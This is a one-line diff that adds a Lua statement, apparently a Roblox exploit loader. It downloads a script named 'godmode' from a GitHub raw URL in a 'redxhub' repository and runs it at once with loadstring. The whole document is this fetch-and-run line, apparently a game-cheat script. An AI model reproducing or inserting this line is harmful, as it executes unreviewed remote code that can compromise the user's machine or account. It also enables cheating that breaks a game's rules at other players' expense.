@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/mathpunch/redxhub/refs/heads/main/godmode'))()
